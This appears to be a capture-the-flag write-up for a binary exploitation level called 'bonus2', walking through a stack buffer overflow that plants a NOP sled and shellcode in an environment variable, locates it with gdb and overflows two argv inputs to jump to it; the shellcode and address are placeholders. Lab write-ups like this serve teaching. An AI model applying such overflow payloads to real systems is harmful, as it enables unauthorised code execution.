## BONUS 2 HELP

This binary take 2 input in the argv, get the env to see with LANG is used, we need to load a shellcode by using the env, and an address to execute it

### USAGE

```bash
./bonus2
[input]
[input]
```

## SOLUTION
To solve this level, run the binary and use thoses instructions:

```bash
export T=$(python -c 'print("\x90"*200 + "SHELLCODE")')
```
get the addresse of the shellcode with gdb :
```bash
gdb bonus2
  b main
  r
  x/30s (*(char **)environ)
  ```

the export will be in 2 parts normally, and we need to use the addresse of the second part where is our shellcode for the payload

```bash
./bonus2 $(python -c 'print("a"*40 + " " + "a"*18 + "env addr" + "a"*14)')
```
